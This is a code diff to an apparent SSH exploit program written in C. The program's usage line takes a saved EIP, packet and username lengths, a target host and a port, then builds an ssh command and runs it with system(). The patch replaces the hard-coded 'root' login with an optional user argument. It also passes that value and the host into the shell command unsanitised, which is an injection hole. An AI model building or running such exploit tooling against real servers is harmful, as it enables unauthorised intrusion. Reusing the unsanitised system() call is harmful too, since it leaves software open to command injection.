@@ -22,10 +22,12 @@ int main(int argc, char *argv[])
 
     if (argc < 8)
     {
-        printf("\nUsage: %s <saved eip> <count> <packet length> <username length> <host> <port> <h(i)>\n\n", argv[0]);
+        printf("\nUsage: %s <saved eip> <count> <packet length> <username length> <host> <port> <h(i)> [user]\n\n", argv[0]);
         fflush(stdout);
         exit(0);
     }
+
+    const char *user = (argc >= 9) ? argv[8] : "root";
 
     port = atoi(argv[6]);
     buffer = (char *) malloc(28);
@@ -73,7 +75,7 @@ int main(int argc, char *argv[])
     close(f);
 
     /* Construct SSH command */
-    size_t cmd_len = strlen(PATH_SSH) + 100 + strlen(argv[5]);
+    size_t cmd_len = strlen(PATH_SSH) + 100 + strlen(argv[5]) + strlen(user);
     ssh_cmd = (char *) malloc(cmd_len);
     if (!ssh_cmd) {
         perror("malloc ssh_cmd");
@@ -81,7 +83,7 @@ int main(int argc, char *argv[])
         exit(1);
     }
     
-    snprintf(ssh_cmd, cmd_len, "%s -p %i -v -l root %s", PATH_SSH, port, argv[5]);
+    snprintf(ssh_cmd, cmd_len, "%s -p %i -v -l %s %s", PATH_SSH, port, user, argv[5]);
     
     printf("Executing: %s\n", ssh_cmd);
     int ret = system(ssh_cmd);
